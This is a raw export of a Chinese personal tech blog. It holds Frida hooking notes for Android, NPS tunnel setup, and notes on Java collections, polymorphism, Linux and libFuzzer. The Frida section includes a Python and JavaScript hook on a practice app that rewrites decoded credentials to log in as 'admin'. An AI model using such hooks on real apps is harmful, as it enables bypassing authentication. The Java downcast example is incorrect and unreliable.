class="string">&#x27;payload&#x27;</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;message:&quot;</span>,message)</span><br><span class="line">        data = <span class="built_in">str</span>(base64.b64decode(data))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line">        <span class="comment">#得到原来的用户名密码</span></span><br><span class="line">        usr,pwd = data.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;pw:&#x27;</span>,pwd)</span><br><span class="line">        <span class="comment">#不管用户输入的用户名是什么，都会将其用户名修改为admin,然后使用自己的原来的密码就可以进行登录</span></span><br><span class="line">        data = <span class="built_in">str</span>(base64.b64encode((<span class="string">&quot;admin&quot;</span>+<span class="string">&quot;:&quot;</span>+pwd).encode()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;encode data:&quot;</span>,data)</span><br><span class="line">        script.post(&#123;<span class="string">&quot;mydata&quot;</span>:data&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Modified data sent!&#x27;</span>)</span><br><span class="line"><span class="comment">#获取设备</span></span><br><span class="line">str_host = <span class="string">&#x27;192.168.3.131:8888&#x27;</span></span><br><span class="line">manager = frida.get_device_manager()</span><br><span class="line">device = manager.add_remote_device(str_host)</span><br><span class="line"><span class="comment">#建立会话</span></span><br><span class="line">session = device.attach(<span class="string">&quot;com.example.lesson7sec&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;lesson7sec.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"><span class="comment">#让程序持续运行，不要退出，如果输入任意字符，则会导致程序退出</span></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//js脚本</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;    <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.widget.TextView&quot;</span>).<span class="property">setText</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.CharSequence&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> string_to_send_x = x.<span class="title function_">toString</span>()</span><br><span class="line">        <span class="keyword">var</span> string_to_recv;</span><br><span class="line">    <span class="comment">//将参数发送给python</span></span><br><span class="line">        <span class="title function_">send</span>(string_to_send_x)</span><br><span class="line">    <span class="comment">//接受python传回来的数据</span></span><br><span class="line">        <span class="title function_">recv</span>(<span class="keyword">function</span>(<span class="params">recv_json_objection</span>)&#123;</span><br><span class="line">            <span class="comment">//这里取决于传回来的数据的格式</span></span><br><span class="line">            string_to_recv = recv_json_objection.<span class="property">mydata</span>                </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;string_to_recv:&quot;</span>.<span class="property">string_to_recv</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="comment">//将字符串转换成Java的字符串</span></span><br><span class="line">        <span class="keyword">var</span> javaStringRecv = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(string_to_recv)</span><br><span class="line">	<span class="comment">//设置app上面的结果，需要根据逻辑进行相关的变通</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setText</span>(javaStringRecv)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x.toString(),result:&quot;</span>,x.<span class="title function_">toString</span>())</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="NPS连接"><a href="#NPS连接" class="headerlink" title="NPS连接"></a>NPS连接</h1><p>nps是<strong>内网穿透</strong>代理服务器。支持<strong>tcp、udp流量转发</strong>等</p>
<p>nps服务器、npc客户端</p>
<p>这里的主要目的是将手机的frida映射到电脑上。由于虚拟机ip地址等原因，这里选择的是，在主机上进行安装服务器</p>
<p>环境配置：</p>
<ol>
<li>首先需要电脑主机安装上nps服务器:<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></li>
<li>在服务器上：添加一个客户端（登录：localhost:8080 admin 123）</li>
<li>获得客户端连接命令：<code>./npc.exe -server=localhost:8024 -vkey=o3d69gc4zpj8u5df -type=tcp</code></li>
<li>然后需要将手机安装上一个nps客户端，使用linux_arm_64即可，将其解压到和frida相同得目录，修改权限</li>
<li>运行客户端得npc: <code>/data/local/tmp/linux_arm64_client/npc  -server=192.168.3.125:8024 -vkey=o3d69gc4zpj8u5df -type=tcp</code></li>
<li>在服务端添加一个tcp隧道，设置服务端58888，目标端口：8888，<strong>这样连接服务器得58888端口就可以映射到手机上得frida程序8888端口</strong></li>
<li>然后再使用python脚本得时候，获取得设备得时候，其设备得ip地址就不是原来得手机得IP地址，而是服务器的ip地址和58888端口了：<code>str_host = &#39;192.168.3.131:8888&#39;   改为  str_host = &#39;192.168.3.125:58888&#39;</code></li>
</ol>
<h1 id="使用工具生成dex文件"><a href="#使用工具生成dex文件" class="headerlink" title="使用工具生成dex文件"></a>使用工具生成dex文件</h1><p>自己制作dex文件，方便再同样的Java环境下，对一些数据进行解码等操作</p>
<ol>
<li><p>使用AS编写Java文件，build,在app\build\intermediates\javac\debug\classes\下找到相关的class文件</p>
</li>
<li><p>D:\Android\Sdk\build-tools\29.0.3&gt;d8 target.class</p>
</li>
<li><p>adb push classes.dex &#x2F;data&#x2F;loal&#x2F;tmp&#x2F;</p>
</li>
<li><p>chmod 777  &#x2F;data&#x2F;local&#x2F;tmp&#x2F;classes.dex</p>
</li>
</ol>
<p>使用js调用dex文件并使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/classes.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> reverse = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;类的签名&#x27;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;method1:&quot;</span>,reverse.<span class="title function_">method1</span>())</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;method2:&#x27;</span>,reverse.<span class="title function_">method2</span>())</span><br><span class="line">)&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用adb 输入字符串到edittext</strong></p>
<ol>
<li>adb shell</li>
<li>input text “text “</li>
</ol>
<h1 id="AS-build"><a href="#AS-build" class="headerlink" title="AS build"></a>AS build</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">repositories &#123;</span><br><span class="line">    maven &#123; url &quot;https://maven.aliyun.com/repository/public&quot; &#125;</span><br><span class="line">    maven &#123; url &quot;https://repo.huaweicloud.com/repository/maven&quot; &#125;</span><br><span class="line">    mavenLocal()</span><br><span class="line">    mavenCentral()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>frp: <a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<p>nps: <a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
<p>frida：<a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p>
<p>objection:<a href="https://github.com/sensepost/objection">https://github.com/sensepost/objection</a></p>
<p>frida教程：<a href="https://www.anquanke.com/post/id/197657#h3-8">https://www.anquanke.com/post/id/197657#h3-8</a></p>
<p>zentracer:<a href="https://github.com/hluwa/ZenTracer">https://github.com/hluwa/ZenTracer</a></p>
<p>frida-dexdump:<a href="https://github.com/hluwa/frida-dexdump">https://github.com/hluwa/frida-dexdump</a></p>
<p>wallbreak:<a href="https://github.com/hluwa/Wallbreaker">https://github.com/hluwa/Wallbreaker</a></p>
<p>z3: <a href="https://github.com/Z3Prover/z3">https://github.com/Z3Prover/z3</a></p>
]]></content>
      <categories>
        <category>Android安全</category>
        <category>frida</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
        <tag>frida</tag>
      </tags>
  </entry>
  <entry>
    <title>java collection</title>
    <url>/2018/01/27/java-collection/</url>
    <content><![CDATA[<h1 id="集合框架collection"><a href="#集合框架collection" class="headerlink" title="集合框架collection"></a>集合框架collection</h1><p>  是集合的顶层接口，他的子体系有重复的，有唯一的，有有序的，也有无序的。</p>
<p><img src="https://raw.githubusercontent.com/Dfault0/images/main/20220415125923.png"></p>
<span id="more"></span>

<h2 id="collection-基本函数"><a href="#collection-基本函数" class="headerlink" title="collection 基本函数"></a>collection 基本函数</h2><ul>
<li>添加：boolean add(E e)</li>
<li>删除：boolean remove(Object o)</li>
<li>判断：boolean isEmpty();boolean contains(Object o)</li>
<li>获取：Iterator<E> iterator()</li>
<li>长度：int size()</li>
</ul>
<table>
<thead>
<tr>
<th>Modifier and Type</th>
<th>Method and Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>boolean</code></td>
<td><code>add(E e)</code>  确保此集合包含指定的元素（可选操作）。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>addAll(Collection&lt;? extends E&gt; c)</code>  将指定集合中的所有元素添加到此集合（可选操作）。</td>
</tr>
<tr>
<td><code>void</code></td>
<td><code>clear()</code>  从此集合中删除所有元素（可选操作）。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>contains(Object o)</code>  如果此集合包含指定的元素，则返回 <code>true</code> 。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>containsAll(Collection&lt;?&gt; c)</code>  如果此集合包含指定 <code>集合</code>中的所有元素，则返回true。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>equals(Object o)</code>  将指定的对象与此集合进行比较以获得相等性。</td>
</tr>
<tr>
<td><code>int</code></td>
<td><code>hashCode()</code>  返回此集合的哈希码值。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>isEmpty()</code>  如果此集合不包含元素，则返回 <code>true</code> 。</td>
</tr>
<tr>
<td><code>Iterator&lt;E&gt;</code></td>
<td><code>iterator()</code>  返回此集合中的元素的迭代器。</td>
</tr>
<tr>
<td><code>default Stream&lt;E&gt;</code></td>
<td><code>parallelStream()</code>  返回可能并行的 <code>Stream</code>与此集合作为其来源。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>remove(Object o)</code>  从该集合中删除指定元素的单个实例（如果存在）（可选操作）。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>removeAll(Collection&lt;?&gt; c)</code>  删除指定集合中包含的所有此集合的元素（可选操作）。</td>
</tr>
<tr>
<td><code>default boolean</code></td>
<td><code>removeIf(Predicate&lt;? super E&gt; filter)</code>  删除满足给定谓词的此集合的所有元素。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>retainAll(Collection&lt;?&gt; c)</code>  仅保留此集合中包含在指定集合中的元素（可选操作）。</td>
</tr>
<tr>
<td><code>int</code></td>
<td><code>size()</code>  返回此集合中的元素数。</td>
</tr>
<tr>
<td><code>default Spliterator&lt;E&gt;</code></td>
<td><code>spliterator()</code>  创建一个<a href="../../java/util/Spliterator.html"><code>Spliterator</code></a>在这个集合中的元素。</td>
</tr>
<tr>
<td><code>default Stream&lt;E&gt;</code></td>
<td><code>stream()</code>  返回以此集合作为源的顺序 <code>Stream</code> 。</td>
</tr>
<tr>
<td><code>Object[]</code></td>
<td><code>toArray()</code>  返回一个包含此集合中所有元素的数组。</td>
</tr>
<tr>
<td><code>&lt;T&gt; T[]</code></td>
<td><code>toArray(T[] a)</code>  返回包含此集合中所有元素的数组;  返回的数组的运行时类型是指定数组的运行时类型。</td>
</tr>
</tbody></table>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
<li><p>List: (interface)</p>
<ul>
<li>ArrayList</li>
<li>Vector</li>
<li>LinkedList</li>
</ul>
</li>
<li><p>Set: (interface)</p>
<ul>
<li>HashSet</li>
<li>TreeSet</li>
</ul>
</li>
</ul>
<h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//A:将集合转换成数组</span></span><br><span class="line"><span class="comment">//B：迭代器</span></span><br><span class="line"><span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> arrayList.iterator();</span><br><span class="line"><span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">	<span class="type">Student</span> <span class="variable">temp</span> <span class="operator">=</span> (Student) iterator.next();</span><br><span class="line">	System.out.println(temp.getName()+<span class="string">&#x27;,&#x27;</span>+temp.getAge());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//C：增强 for：</span></span><br><span class="line"><span class="keyword">for</span>(ArrayList&lt;Student&gt; arrayList:boss) &#123;</span><br><span class="line">	<span class="keyword">for</span>(Student temp:arrayList) &#123;</span><br><span class="line">		<span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> temp;</span><br><span class="line">		System.out.println(student.getName()+student.getAge());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>  有序，可重复</p>
<h4 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4><ul>
<li><p>ArrayList：底层数据结构是数组，查询快，增删慢。线程不安全，效率高。</p>
</li>
<li><p>Vector：底层数据结构是数组，查询快，增删慢。线程安全，效率低。</p>
</li>
<li><p>LinkedList：底层数据结构是链表，查询慢，增删快。线程不安全，效率高。
  </p>
<ul>
<li><p>添加</p>
<ul>
<li>addFirst()    addLast()</li>
</ul>
</li>
<li><p>删除</p>
<ul>
<li>removeFirst()  removeLast()</li>
</ul>
</li>
<li><p>获取</p>
<ul>
<li>getFirst()  getLast()</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>set集合的特点：无序，且唯一（equals() 和 hashcode()）<br>注意：如果集合的元素是自定义对象，则需要重写equals() 和 hashcode()方法。（在eclipse中可以自动生成）</p>
<h4 id="分类-2"><a href="#分类-2" class="headerlink" title="分类"></a>分类</h4><ul>
<li><p>HashSet</p>
<ul>
<li>底层数据结构是哈希表(是一个元素为链表的数组)</li>
<li>哈希表底层依赖两个方法：hashCode()和equals()</li>
<li>添加元素执行顺序：</li>
<li>首先比较哈希值是否相同？<br>    相同：继续执行equals()方法<br>          返回true：元素重复了，不添加<br>          返回false：直接把元素添加到集合<br>      不同：就直接把元素添加到集合</li>
</ul>
</li>
<li><p>TreeSet</p>
<ul>
<li>底层数据结构是红黑树(是一个自平衡的二叉树)</li>
<li>保证元素的排序方式<ul>
<li>a:自然排序(元素具备比较性)：让元素所属的类实现Comparable接口</li>
<li>比较器排序(集合具备比较性)：让集合构造方法接收Comparator的实现类对象</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h1><p>基本函数</p>
<table>
<thead>
<tr>
<th>Modifier and Type</th>
<th>Method and Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>void</code></td>
<td><code>clear()</code>  从该地图中删除所有的映射（可选操作）。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>compute(K key, BiFunction&lt;? super K,? super V,? extends V&gt; remappingFunction)</code>  尝试计算指定键的映射及其当前映射的值（如果没有当前映射， <code>null</code> ）。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>computeIfAbsent(K key, Function&lt;? super K,? extends V&gt; mappingFunction)</code>  如果指定的键尚未与值相关联（或映射到 <code>null</code>  ），则尝试使用给定的映射函数计算其值，并将其输入到此映射中，除非 <code>null</code> 。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>computeIfPresent(K key, BiFunction&lt;? super K,? super V,? extends V&gt; remappingFunction)</code>  如果指定的密钥的值存在且非空，则尝试计算给定密钥及其当前映射值的新映射。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>containsKey(Object key)</code>  如果此映射包含指定键的映射，则返回 <code>true</code> 。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>containsValue(Object value)</code>  如果此地图将一个或多个键映射到指定的值，则返回 <code>true</code> 。</td>
</tr>
<tr>
<td><code>Set&lt;Map.Entry&lt;K,V&gt;&gt;</code></td>
<td><code>entrySet()</code>  返回此地图中包含的映射的<a href="../../java/util/Set.html"><code>Set</code></a>视图。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>equals(Object o)</code>  将指定的对象与此映射进行比较以获得相等性。</td>
</tr>
<tr>
<td><code>default void</code></td>
<td><code>forEach(BiConsumer&lt;? super K,? super V&gt; action)</code>  对此映射中的每个条目执行给定的操作，直到所有条目都被处理或操作引发异常。</td>
</tr>
<tr>
<td><code>V</code></td>
<td><code>get(Object key)</code>  返回到指定键所映射的值，或 <code>null</code>如果此映射包含该键的映射。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>getOrDefault(Object key, V defaultValue)</code>  返回到指定键所映射的值，或 <code>defaultValue</code>如果此映射包含该键的映射。</td>
</tr>
<tr>
<td><code>int</code></td>
<td><code>hashCode()</code>  返回此地图的哈希码值。</td>
</tr>
<tr>
<td><code>boolean</code></td>
<td><code>isEmpty()</code>  如果此地图不包含键值映射，则返回 <code>true</code> 。</td>
</tr>
<tr>
<td><code>Set&lt;K&gt;</code></td>
<td><code>keySet()</code>  返回此地图中包含的键的<a href="../../java/util/Set.html"><code>Set</code></a>视图。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>merge(K key, V value, BiFunction&lt;? super V,? super V,? extends V&gt; remappingFunction)</code>  如果指定的键尚未与值相关联或与null相关联，则将其与给定的非空值相关联。</td>
</tr>
<tr>
<td><code>V</code></td>
<td><code>put(K key, V value)</code>  将指定的值与该映射中的指定键相关联（可选操作）。</td>
</tr>
<tr>
<td><code>void</code></td>
<td><code>putAll(Map&lt;?  extends K,?  extends V&gt; m)</code>  将指定地图的所有映射复制到此映射（可选操作）。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>putIfAbsent(K key, V value)</code>  如果指定的键尚未与某个值相关联（或映射到 <code>null</code> ）将其与给定值相关联并返回  <code>null</code> ，否则返回当前值。</td>
</tr>
<tr>
<td><code>V</code></td>
<td><code>remove(Object key)</code>  如果存在（从可选的操作），从该地图中删除一个键的映射。</td>
</tr>
<tr>
<td><code>default boolean</code></td>
<td><code>remove(Object key, Object value)</code>  仅当指定的密钥当前映射到指定的值时删除该条目。</td>
</tr>
<tr>
<td><code>default V</code></td>
<td><code>replace(K key, V value)</code>  只有当目标映射到某个值时，才能替换指定键的条目。</td>
</tr>
<tr>
<td><code>default boolean</code></td>
<td><code>replace(K key, V oldValue, V newValue)</code>  仅当当前映射到指定的值时，才能替换指定键的条目。</td>
</tr>
<tr>
<td><code>default void</code></td>
<td><code>replaceAll(BiFunction&lt;? super K,? super V,? extends V&gt; function)</code>  将每个条目的值替换为对该条目调用给定函数的结果，直到所有条目都被处理或该函数抛出异常。</td>
</tr>
<tr>
<td><code>int</code></td>
<td><code>size()</code>  返回此地图中键值映射的数量。</td>
</tr>
<tr>
<td><code>Collection&lt;V&gt;</code></td>
<td><code>values()</code>  返回此地图中包含的值的<a href="../../java/util/Collection.html"><code>Collection</code></a>视图。</td>
</tr>
</tbody></table>
<h2 id="遍历-1"><a href="#遍历-1" class="headerlink" title="遍历"></a>遍历</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">      map.put(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">      map.put(<span class="string">&quot;2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">      map.put(<span class="string">&quot;3&quot;</span>, <span class="string">&quot;value3&quot;</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//第一种：普遍使用，二次取值</span></span><br><span class="line">      System.out.println(<span class="string">&quot;通过Map.keySet遍历key和value：&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (String key : map.keySet()) &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;key= &quot;</span>+ key + <span class="string">&quot; and value= &quot;</span> + map.get(key));</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//第二种</span></span><br><span class="line">      System.out.println(<span class="string">&quot;通过Map.entrySet使用iterator遍历key和value：&quot;</span>);</span><br><span class="line">      Iterator&lt;Map.Entry&lt;String, String&gt;&gt; it = map.entrySet().iterator();</span><br><span class="line">      <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">       Map.Entry&lt;String, String&gt; entry = it.next();</span><br><span class="line">       System.out.println(<span class="string">&quot;key= &quot;</span> + entry.getKey() + <span class="string">&quot; and value= &quot;</span> + entry.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//第三种：推荐，尤其是容量大时</span></span><br><span class="line">      System.out.println(<span class="string">&quot;通过Map.entrySet遍历key和value&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;key= &quot;</span> + entry.getKey() + <span class="string">&quot; and value= &quot;</span> + entry.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">      <span class="comment">//第四种</span></span><br><span class="line">      System.out.println(<span class="string">&quot;通过Map.values()遍历所有的value，但不能遍历key&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (String v : map.values()) &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;value= &quot;</span> + v);</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>java官方文档</p>
<p>菜鸟教程：<a href="https://www.runoob.com/java/java-collections.html">https://www.runoob.com/java/java-collections.html</a></p>
]]></content>
      <categories>
        <category>code</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>code</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java 多态</title>
    <url>/2018/01/06/java-%E5%A4%9A%E6%80%81/</url>
    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>同一个对象在不同时刻所体现的不同状态<br>子类可以当做父类使用，但是父类不能当做子类使用（狗是动物，但动物不是狗）</p>
<h2 id="多态的前提"><a href="#多态的前提" class="headerlink" title="多态的前提"></a>多态的前提</h2><blockquote>
<ul>
<li>有继承或者实现</li>
<li>有方法重写</li>
<li>有父类或者父类解救引用指向子类对象 ： 父 F &#x3D; new 子</li>
</ul>
</blockquote>
<span id="more"></span>

<h2 id="多态的分类"><a href="#多态的分类" class="headerlink" title="多态的分类"></a>多态的分类</h2><p>1.具体类多态</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="type">Father</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br></pre></td></tr></table></figure>

<p>2.抽象类多态</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="type">Father</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br></pre></td></tr></table></figure>

<p>3.接口类多态</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">implements</span> <span class="title class_">Father</span> &#123; &#125;</span><br><span class="line"><span class="type">Father</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br></pre></td></tr></table></figure>

<h2 id="多态中的成员访问特点"><a href="#多态中的成员访问特点" class="headerlink" title="多态中的成员访问特点"></a>多态中的成员访问特点</h2><ol>
<li>成员变量<br>编译看father，运行看son</li>
<li>构造方法<br>创建子类对象的时候要先访问父类的构造方法，对父类的数据进行初始化（子类所有的构造方法都会先访问父类的无参构造）</li>
<li>成员方法<br>编译看father，运行看son（方法有重写）</li>
<li>静态方法<br>编译运行都是看father（和类相关）</li>
</ol>
<h2 id="多态的利与弊"><a href="#多态的利与弊" class="headerlink" title="多态的利与弊"></a>多态的利与弊</h2><ul>
<li>好处<ul>
<li>提高代码的维护性（继承）</li>
<li>提高代码的扩展性（多态）</li>
</ul>
</li>
<li>弊处<ul>
<li>父类不能使用子类的特有功能</li>
</ul>
</li>
</ul>
<h2 id="多态中的转型"><a href="#多态中的转型" class="headerlink" title="多态中的转型"></a>多态中的转型</h2><p>1.向上转型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Father</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br></pre></td></tr></table></figure>

<p>2.向下转型：把父类的引用强制转换成子类的引用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Son</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Father</span>();</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>code</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>code</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>linux-基础知识</title>
    <url>/2022/04/01/linux-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><p>vim是vi的升级</p>
<p>vim有三种模式：普通模式、插入模式、命令模式</p>
<p>&lt; !– more –&gt;</p>
<ol>
<li><p>普通模式-&gt;插入模式：</p>
<ul>
<li>i 光标不动，在原光标的前面插入数据</li>
<li>a光标后移一位，在光标后面插入数据</li>
<li>I在本行的开始位置插入数据</li>
<li>A在本行的结束位置处插入数据</li>
<li>o 在本行下面创建一个空行</li>
<li>O 在本行的上一行创建一个空行</li>
</ul>
</li>
<li><p>普通模式下的命令较多</p>
</li>
<li><p>命令模式下的命令：</p>
<ul>
<li>wq 保存并退出文件</li>
<li>q 退出文件</li>
<li>q! 强制退出</li>
</ul>
</li>
</ol>
<span id="more"></span>

<h1 id="查看文件的方式"><a href="#查看文件的方式" class="headerlink" title="查看文件的方式"></a>查看文件的方式</h1><ol>
<li>cat [-n -b ] filename </li>
<li>tac 倒叙查看文件内容 （从最后一行开始）</li>
<li>head [-n] filename直接查看,默认前10行</li>
<li>tail [-n] filename 倒叙查看，默认前10行</li>
<li>more filename 文件过大，分页显示内容，空格建翻页</li>
<li>wc 文件名 统计一个文件中各种数据的数量计算文件的byte 数，字数，列数等</li>
</ol>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>libFuzzer workshop study</title>
    <url>/2021/11/15/libFuzzer-workshop-study/</url>
    <content><![CDATA[<h1 id="libFuzzer-workshop-study"><a href="#libFuzzer-workshop-study" class="headerlink" title="libFuzzer workshop study"></a>libFuzzer workshop study</h1><h2 id="libfuzzer-基本使用方法（官方）"><a href="#libfuzzer-基本使用方法（官方）" class="headerlink" title="libfuzzer 基本使用方法（官方）"></a>libfuzzer 基本使用方法（官方）</h2><p>The first step in using libFuzzer on a library is to implement a <em>fuzz target</em> – a function that accepts an array of bytes and does something interesting with these bytes using the API under test. Like this:</p>
<p>fuzzer target的主要写法如下:</p>
